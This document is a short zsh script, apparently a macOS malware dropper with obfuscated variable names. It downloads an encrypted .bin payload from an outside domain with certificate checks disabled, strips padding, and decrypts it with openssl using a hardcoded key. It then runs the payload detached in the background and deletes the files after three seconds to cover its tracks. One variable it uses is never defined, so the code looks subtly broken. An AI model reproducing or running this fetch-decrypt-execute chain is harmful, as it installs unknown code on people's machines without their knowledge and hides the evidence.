#!/bin/zsh
ggcpd=$(mktemp /tmp/94aekb.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mfe37992a18314678.bin" -o "$ggcpdz" || exit 1
b5t76s=$(stat -f %z "$ggcpdz"); drk9whe=$(( b5t76s - 2571 - 3091 ))
tail -c +$(( 2571 + 1 )) "$ggcpdz" | head -c $drk9whe | openssl enc -d -aes-256-cbc -k e9a49395c74d5f02f28e28cf -out "$ggcpd" 2>/dev/null
[ -s "$ggcpd" ] && chmod 700 "$ggcpd" && ( "$ggcpd" & ) && disown
( sleep 3; rm -f "$ggcpd" "$ggcpdz" ) &>/dev/null &
